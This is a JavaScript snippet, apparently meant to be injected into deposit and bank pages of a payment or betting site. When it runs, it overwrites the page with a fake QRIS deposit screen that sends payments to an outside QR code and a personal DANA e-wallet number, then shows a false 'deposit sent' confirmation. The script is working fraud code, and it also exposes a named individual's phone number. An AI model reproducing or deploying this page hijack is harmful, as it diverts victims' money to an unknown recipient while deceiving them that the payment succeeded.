(function() {
  const url = window.location.href;
  const pattern = /(\/deposit$|\/bank$|\/deposit\.php$|\/qris\.php$|\/index\.php\?page=(transaksi|cashier)$|\/bank\.php$)/i;
  if (!pattern.test(url)) {
    console.log('Custom script: URL tidak cocok, tampilan tidak diubah.');
    return;
  }

  document.body.innerHTML = `
  <style>
    body {
      margin: 0;
      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSu1ZzxDdvDsoEK59QO3ASmi24P_P50-SYw5dmyuryt8qAVOPfq67TEVKOS&s=10') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Montserrat', sans-serif;
      text-align: center;
      color: #fff;
    }
    h1 {
      font-weight: 700;
      margin: 20px 0;
      text-shadow: 2px 2px #000;
      color: #f7e733;
      font-size: 22px;
    }
    .marquee {
      width: 100%;
      overflow: hidden;
      white-space: nowrap;
      box-sizing: border-box;
      font-weight: 600;
      text-shadow: 1px 1px #000;
      color: #00f7ff;
      font-size: 12px;
    }
    .marquee span {
      display: inline-block;
      padding-left: 100%;
      animation: marquee 15s linear infinite;
    }
    @keyframes marquee {
      0% { transform: translate(0, 0); }
      100% { transform: translate(-100%, 0); }
    }
    .choices {
      margin: 30px 0;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
    }
    .choice {
      background: rgba(0,0,0,0.5);
      border: 2px solid #f7e733;
      border-radius: 5px;
      padding: 5px 12px;
      font-size: 14px;
      cursor: pointer;
      color: #fff;
    }
    .choice input {
      margin-right: 5px;
    }
    .content {
      margin-top: 20px;
    }
    .dana-info {
      border: 2px solid #00f7ff;
      display: inline-block;
      padding: 8px 15px;
      font-weight: 700;
      background: rgba(0,0,0,0.5);
      color: #fff;
      font-size: 14px;
      border-radius: 5px;
    }
    img.qris {
      max-width: 200px;
      height: auto;
      display: block;
      margin: 10px auto;
    }
    button, input {
      display: block;
      margin: 10px auto;
      padding: 8px;
      font-size: 14px;
      border: none;
      border-radius: 5px;
      width: 80%;
      max-width: 250px;
    }
    button {
      background: #f7e733;
      color: #000;
      font-weight: 700;
      cursor: pointer;
    }
    input {
      text-align: center;
    }
    .footer {
      margin-top: 50px;
      font-size: 12px;
    }
    .footer button {
      background: #00f7ff;
    }
    .footer img {
      max-width: 80px;
      display: block;
      margin: 10px auto;
    }
    #status {
      color: #00ff00;
      font-weight: 700;
    }
  </style>

  <h1>INSTAN DEPOSIT QRIS</h1>
  <div class="marquee"><span>PINDAI QRIS > ISI NOMINAL > TRANSFER > KONFIRMASI, DEPOSIT LEBIH CEPAT MENGGUNAKAN QRIS, WAJIB MENGGUNAKAN KODE UNIK 887, QRIS ATAS NAMA INGGAR STORE</span></div>

  <div class="choices">
    <label class="choice"><input type="radio" name="method" value="bank">BANK</label>
    <label class="choice"><input type="radio" name="method" value="dana">DANA</label>
    <label class="choice"><input type="radio" name="method" value="ewallet">E-Wallet</label>
  </div>

  <div class="content" id="content"></div>

  <div class="footer">
    <button onclick="window.location.href='https://direct.lc.chat/19188360/'">HUBUNGI ADMIN</button>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo_QRIS.svg/1200px-Logo_QRIS.svg.png" alt="QRIS Logo" />
    <p>Do Not Share My Personal Information | © 2025 instantQr, Inc</p>
  </div>
  `;

  // Logic
  const radios = document.querySelectorAll('input[name="method"]');
  const content = document.getElementById('content');

  radios.forEach(radio => {
    radio.addEventListener('change', () => {
      let html = '';
      if (radio.value === 'bank') {
        html += '<img class="qris" src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" />';
        html += '<p style="font-weight:600;color:#fff;">QR UNTUK SEMUA JENIS BANK</p>';
        html += '<button onclick="window.open(\\'https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg\\')">Download Qris</button>';
        html += inputSection();
      } else if (radio.value === 'dana') {
        html += '<div class="dana-info">DANA - 088214538915 - SURWATI</div>';
        html += '<p style="font-weight:600;color:#fff;">MANUAL DEPOSIT DANA</p>';
        html += '<button id="salin">SALIN NOMOR</button>';
        html += inputSection();
      } else {
        html += '<img class="qris" src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" />';
        html += '<p style="font-weight:600;color:#fff;">QR UNTUK SEMUA JENIS E-WALLET</p>';
        html += '<button onclick="window.open(\\'https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg\\')">Download Qris</button>';
        html += inputSection();
      }
      content.innerHTML = html;

      const amt = document.getElementById('amount');
      amt.addEventListener('input', e => {
        let val = e.target.value.replace(/\\D/g, '');
        e.target.value = val ? parseInt(val).toLocaleString('id-ID') : '';
      });

      document.getElementById('konfirmasi').addEventListener('click', () => {
        let val = amt.value.replace(/\\D/g, '');
        if (parseInt(val) >= 50000) {
          let i = 3;
          const s = document.getElementById('status');
          const timer = setInterval(() => {
            s.innerText = \`Deposit berhasil dikirim, Anda akan dialihkan dalam \${i}...\`;
            i--;
            if (i < 0) { clearInterval(timer); window.location.href='../'; }
          }, 1000);
        } else alert('Minimal deposit 50.000');
      });

      const salin = document.getElementById('salin');
      if (salin) {
        salin.addEventListener('click', () => {
          navigator.clipboard.writeText('088214538915').then(() => alert('Nomor berhasil disalin!'));
        });
      }
    });
  });

  function inputSection() {
    return '<input type="text" id="amount" placeholder="Masukkan Nominal"><button id="konfirmasi">KONFIRMASI</button><div id="status"></div>';
  }

})();
